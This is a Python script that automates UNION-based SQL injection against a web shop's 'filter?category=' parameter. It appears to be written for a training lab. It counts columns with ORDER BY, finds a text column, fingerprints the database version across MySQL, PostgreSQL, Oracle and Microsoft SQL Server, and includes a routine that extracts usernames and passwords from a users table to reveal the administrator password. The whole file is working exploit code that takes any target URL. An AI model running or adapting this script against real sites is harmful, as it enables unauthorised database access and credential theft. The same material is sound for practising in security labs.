from cgitb import text
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
import menu
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

global dbDetected
list_databases=[("MySQL","@@version",""," "),
                    ("PostgreSQL","version()","","||"),
                    ("Oracle","banner","FROM v$version","||"),
                    ("Microsoft","@@version","","+")]

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def exploit_sqli_column_number(url):
    path = "filter?category=Gifts"
    for i in range(1,20):  
        sql_payload = "' order by %s -- -" %i
        r = requests.get(url + path + sql_payload, verify=False)#, proxies=proxies)
        #print(url + path + sql_payload)
        res = r.text
        #print(res)
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False

def exploit_sqli_string_field(url, num_col):
    path = "filter?category=Gifts"
    
    for i in range(1, num_col+1):
        payload_list = ['null'] * num_col
        payload_list[i-1] = "'test'"
        fromdual=''# FROM dual '
        sql_payload = "' union select " + ','.join(payload_list) + fromdual + "-- -"
        
        result = requests.get(url + path + sql_payload, verify=False)#, proxies=proxies)
        #print(url + path + sql_payload)
        soup = BeautifulSoup(result.content, 'html.parser')
        res = str(soup.find_all("div", {'class':'container is-page'}))

        if "test" in res:
            return i
    return False

def exploit_sqli_database_version(url,num_col,string_column):
    path = "filter?category="
    for i in range(0, len(list_databases)-1):
        payload_list = ['null'] * num_col
        payload_list[string_column-1] = list_databases[i][1]
        sql_payload = "' union select " + ','.join(payload_list) + " " + list_databases[i][2] +" -- -"
        strSeparator=list_databases[i][0]
        
        r = requests.get(url + path + sql_payload, verify=False)#, proxies=proxies)
        #print(url + path + sql_payload)
        soup = BeautifulSoup(r.text, 'html.parser')
        #print(soup)
        if not "Internal Server Error" in str(soup):
            dbversion = soup.findAll("th")
            dbDetected = str(list_databases[i][0])
            print(dbDetected)
            print("[+] "+list_databases[i][0]+"-> The database version is ")
            for li in dbversion:
                print(li.text)
            
            return strSeparator 
    return False


def exploit_sqli_users_table(url,num_col,concatenator):
    username = 'administrator'
    path = 'filter?category=Pets'
    
    for i in range(1, num_col+1):
        payload_list = ['null'] * num_col
        payload_list[i-1] = "username "+concatenator+ "'*'" +concatenator+" password"
        sql_payload = "' union select " + ','.join(payload_list) + " FROM users-- -"

        r = requests.get(url + path + sql_payload, verify=False)#, proxies=proxies)
        soup = BeautifulSoup(r.text, 'html.parser')
        if username in str(soup):
            print("[+] Found the administrator password...")
            admin_password = soup.find(text=re.compile('.*administrator.*')).split("*")[1]
            print("[+] The administrator password is '%s'." % admin_password)
            return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    #print(num_col)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + "." )
        
        string_column = exploit_sqli_string_field(url,num_col)
        if string_column:
            print("[+] The column that contains text is " + str(string_column) + ".")
            
            print("[+] Dumping the version of the database...")
            concatenator = exploit_sqli_database_version(url,num_col,string_column)
            if concatenator is False:
                print("[-] Unable to dump the database version.")
            else:
                #if not exploit_sqli_users_table(url,num_col,concatenator):
                #    print("[-] Did not find an administrator password.")
                print('main.DB:',concatenator)
                menu.menuSQLi(url,num_col,string_column,concatenator)
        else:
            print("[-] We were not able to find a column that has a string data type.")
    else:
        print("[-] The SQLi attack was not successful.")
    